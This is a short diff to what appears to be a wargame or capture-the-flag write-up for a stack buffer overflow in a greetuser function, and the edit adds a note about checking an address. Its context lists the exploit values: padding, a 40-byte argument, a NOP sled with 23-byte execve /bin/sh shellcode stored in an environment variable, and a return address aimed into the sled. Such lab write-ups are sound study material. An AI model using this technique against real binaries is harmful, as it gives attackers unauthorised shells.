@@ -50,7 +50,7 @@ else    : "Hello " → global=0, different branch
 
 ### values (choosing LANG=nl)
 ```
-pad = 76 - 13 - 40 = 23                       ; NB: the original "nl=23 bytes" is wrong — 23 is the pad, not the greeting
+pad = 76 - 13 - 40 = 23                       ; NB: the original "nl=23 bytes" is wrong — 23 is the pad, not the greeting (Maybe have to check right address around <greetuser + 147>)
 argv[1] = "A"*40                              ; forces no-NUL + occupies the 40B slot in strcat
 SC env  = "\x90"*200 + shellcode(23B)         ; execve /bin/sh, shell-storm #575
 target  = &SC + ~100 (sled middle)            ; measure &SC with getaddr, then aim at the middle
